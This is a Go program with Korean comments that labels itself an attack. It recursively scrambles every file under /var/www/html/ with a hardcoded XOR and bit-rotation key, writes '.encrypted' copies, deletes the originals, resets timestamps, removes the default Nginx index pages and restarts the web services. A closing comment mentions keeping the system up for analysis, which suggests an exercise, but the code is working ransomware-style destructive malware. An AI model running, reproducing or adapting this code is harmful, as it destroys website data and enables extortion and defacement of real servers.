package main

import (
	"crypto/sha256"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func main() {
	// =========================================================
	// 1. 암호화 로직
	// =========================================================
	targetDir := "/var/www/html/"
	encryptionKey := "HYEONSU_MAX_SECURITY_KEY_2026_@!"

	// 키를 SHA256으로 해싱해서 더 강력한 32바이트 키 생성
	hash := sha256.Sum256([]byte(encryptionKey))
	finalKey := hash[:]

	log.Printf("🚀 공격 시작 타겟: %s\n", targetDir)

	err := filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}

		// 이미 암호화된 파일은 건너뜜
		if filepath.Ext(path) == ".encrypted" {
			return nil
		}

		// 파일 읽기
		content, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		log.Printf("[ING] Encrypting: %s (Size: %d bytes)", info.Name(), info.Size())

		// 암호화 루프 (XOR + Bit Shift)
		encryptedData := make([]byte, len(content))
		for i := 0; i < len(content); i++ {
			temp := content[i] ^ finalKey[i%len(finalKey)]
			temp = (temp << 3) | (temp >> 5)
			encryptedData[i] = ^temp
		}

		// 파일 쓰기 및 원본 삭제
		newPath := path + ".encrypted"
		err = ioutil.WriteFile(newPath, encryptedData, 0644)
		if err == nil {
			os.Remove(path)
			// 타임스톰핑 (시간 조작)
			currentTime := time.Now().Local()
			os.Chtimes(newPath, currentTime, currentTime)
		}

		return nil
	})

	if err != nil {
		log.Fatalf("❌ 공격 중 에러 발생: %v", err)
	}

	// =========================================================
	// 2. 서비스 정리 및 변조 결과 확인 (종료 기능 제거)
	// =========================================================
	
	fmt.Println("\n==================================================")
	fmt.Println("🗑️  Cleaning up default Nginx pages...")
	// Nginx 기본 페이지 강제 삭제
	exec.Command("rm", "-f", "/var/www/html/index.nginx-debian.html").Run()
	exec.Command("rm", "-f", "/var/www/html/index.html").Run()

	fmt.Println("🔄 Restarting Web Services (Clear Cache)...")
	// 서비스 재시작
	exec.Command("systemctl", "restart", "nginx").Run()
	exec.Command("systemctl", "restart", "php8.1-fpm").Run()

	// [추가] 변조된 파일 목록 확인 (ls -lh)
	fmt.Println("\n🔎 [Verification] Listing modified files in /var/www/html/:")
	fmt.Println("--------------------------------------------------")
	cmdList := exec.Command("ls", "-lh", targetDir)
	cmdList.Stdout = os.Stdout // 결과를 현재 터미널에 바로 출력
	cmdList.Stderr = os.Stderr
	cmdList.Run()
	fmt.Println("--------------------------------------------------")

	fmt.Println("🚨 ATTACK COMPLETE: SYSTEM REMAINS ACTIVE FOR ANALYSIS.")
	fmt.Println("==================================================")

	// 시스템 종료(shutdown) 코드는 삭제되었습니다.
}
